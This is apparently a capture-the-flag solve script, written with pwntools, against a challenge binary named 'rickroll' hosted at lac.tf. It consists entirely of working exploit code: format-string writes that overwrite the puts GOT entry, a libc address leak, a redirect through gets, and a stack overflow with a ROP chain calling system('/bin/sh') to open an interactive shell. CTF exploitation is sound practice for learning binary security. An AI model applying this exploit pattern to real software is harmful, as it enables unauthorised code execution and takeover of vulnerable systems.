#!/usr/bin/env python3


from pwn import *



e = ELF("./rickroll")
libc = ELF("./libc-2.31.so")
#r = process("./rickroll")
r = remote("lac.tf",31135)
exploit = b"%9$n%4434c%8$hn " + p64(e.got.puts) + p64(e.sym.main_called)
r.sendlineafter(b"Lyrics:",exploit)
r.sendlineafter(b"Lyrics:",b"%8$hhn%73$p     " + p64(e.sym.main_called))
r.recvuntil(b"Never gonna run around and ")
libc_base = int(r.recv().split(b" ")[0],16) - 0x23d0a
log.info("The libc base of the process is " + hex(libc_base))
val = int("0x" + hex(libc_base + libc.sym.gets)[-4:],16)
print(hex(val))
gets_write = f"%9$hhn%{val}c%10$hn     " + f"\x6c\x40\x40\x00\x00\x00\x00\x00"  + f"\x30\x40\x40\x00\x00\x00\x00\x00"
r.sendline(gets_write)
r.sendlineafter(b"Lyrics",b"%9$hhn%4150c%10$hn      " + p64(e.sym.main_called) + p64(e.got.puts) + b"A" * 224 + p64(e.sym.main))
r.sendlineafter(b"Lyrics",b"A" * 264 + p64(0x40125b) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system))
r.interactive()
